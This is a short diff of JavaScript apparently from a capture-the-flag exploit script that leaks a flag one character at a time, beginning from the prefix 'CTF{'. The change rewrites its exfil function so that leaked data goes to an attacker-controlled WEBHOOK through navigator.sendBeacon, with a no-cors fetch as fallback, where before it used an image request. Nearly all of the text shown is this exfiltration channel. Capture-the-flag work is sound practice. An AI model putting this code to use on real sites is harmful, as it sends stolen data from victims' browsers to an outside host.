@@ -8,10 +8,17 @@ const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
 let prefix = "CTF{";
 let busy = false;
 
-function exfil(s) {
-  new Image().src = WEBHOOK + "?flag=" + encodeURIComponent(s) + "&t=" + Date.now();
+function exfil(msg) {
+  try {
+    navigator.sendBeacon(WEBHOOK, new Blob([msg], { type: "text/plain" }));
+  } catch (_) {
+    fetch(WEBHOOK + "?d=" + encodeURIComponent(msg) + "&t=" + Date.now(), {
+      method: "GET",
+      mode: "no-cors",
+      cache: "no-store"
+    }).catch(() => {});
+  }
 }
-
 function runRound() {
   if (busy) return;
   busy = true;
